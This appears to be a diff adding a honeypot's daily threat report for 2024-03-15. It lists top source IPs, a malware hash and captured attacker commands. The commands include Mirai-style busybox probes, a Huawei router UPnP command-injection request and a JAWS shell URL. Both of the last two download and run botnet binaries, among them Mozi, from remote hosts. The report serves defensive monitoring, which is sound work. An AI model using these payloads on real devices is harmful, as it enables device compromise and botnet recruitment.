@@ -1,0 +1,42 @@
+Top 5 IPs for 2024-03-15 :
+
+79.175.128.161
+167.99.177.18
+151.177.201.230
+124.28.234.66
+146.235.60.103
+
+Malware Download:
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+Malcious Commands seen:
+
+v2,TERM=xterm-256color,raw:uname -a
+
+guest
+...guest
+guest
+...friend
+enable
+system
+hell
+sh
+cat /proc/mounts; /bin/busybox MDNEA
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MDNEA
+tftp; wget; /bin/busybox MDNEA
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+
+
+
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"
+Content-Length: 467
+
+<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 193.233.193.12 -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
+
+
+
+http://54.243.8.157:80/shell?cd+/tmp;rm+-rf+*;wget+http://59.89.179.186:50597/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
